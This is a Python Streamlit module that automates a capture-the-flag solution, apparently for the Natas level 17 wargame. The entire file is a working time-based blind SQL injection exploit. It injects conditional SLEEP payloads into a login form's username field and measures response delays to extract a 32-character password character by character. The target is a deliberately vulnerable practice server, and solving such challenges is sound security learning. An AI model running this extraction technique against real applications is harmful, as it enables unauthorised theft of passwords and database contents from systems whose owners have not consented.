import streamlit as st
import string
import time

def run(context, session, base_url):
    st.info("Targeting Timing-Based Blind SQL Injection via conditional SLEEP latency tracking...")
    
    # 1. Define character pool and constants
    charset = string.ascii_letters + string.digits
    discovered_password = ""
    password_length = 32
    time_delay = 2  # Seconds to sleep on correct match
    
    # Track the current level's password parameter from context
    current_password = context.get('password', '').strip()
    session.auth = ("natas17", current_password)
    
    # 2. Identify active character footprints to optimize execution time
    st.write("🔍 Scanning active character footprint map via timing analysis...")
    active_chars = []
    
    char_progress = st.progress(0)
    for idx, char in enumerate(charset):
        char_progress.progress((idx + 1) / len(charset))
        
        # Payload checks if character exists anywhere inside the target password field
        payload = f'natas18" AND IF(password LIKE BINARY "%{char}%", SLEEP({time_delay}), 0) #'
        
        start_time = time.time()
        try:
            session.post(base_url, data={"username": payload}, timeout=10)
            elapsed = time.time() - start_time
            
            # If the server takes longer than our delay baseline, the character is present
            if elapsed >= time_delay:
                active_chars.append(char)
                st.write(f" └─ Found active element: `{char}` (Response latency: {elapsed:.2f}s)")
        except Exception:
            continue
            
    st.write(f"✨ Active characters detected: `{', '.join(active_chars)}`")
    
    if not active_chars:
        st.error("No timing fluctuations detected. Verify active sidebar credentials or network latency.")
        return

    # 3. Reconstruct the 32-character token positionally
    st.write("🔄 Commencing step-by-step token character array reconstruction...")
    password_display = st.empty()
    step_progress = st.progress(0)
    
    for position in range(1, password_length + 1):
        found_character_for_position = False
        
        for char in active_chars:
            # Check the character at the exact position index
            payload = f'natas18" AND IF(SUBSTRING(password, {position}, 1) LIKE BINARY "{char}", SLEEP({time_delay}), 0) #'
            
            start_time = time.time()
            try:
                session.post(base_url, data={"username": payload}, timeout=10)
                elapsed = time.time() - start_time
                
                if elapsed >= time_delay:
                    discovered_password += char
                    password_display.code(f"Current Progress: {discovered_password}")
                    found_character_for_position = True
                    break  # Character confirmed, proceed to the next position index
            except Exception as e:
                st.error(f"Connection error inside evaluation sequence loop: {str(e)}")
                return
                
        step_progress.progress(position / password_length)
        
        if not found_character_for_position:
            st.warning(f"Could not conclusively verify index position {position} via latency profile.")
            break

    # 4. Present final token extraction properties
    if len(discovered_password) == password_length:
        st.success("🎯 Level 17 challenge resolved successfully!")
        st.code(f"Natas 18 Password: {discovered_password}")
    else:
        st.warning("Automation extraction complete, but token string length does not match expected baseline dimensions.")
        if discovered_password:
            st.code(f"Partial Password Fragment: {discovered_password}")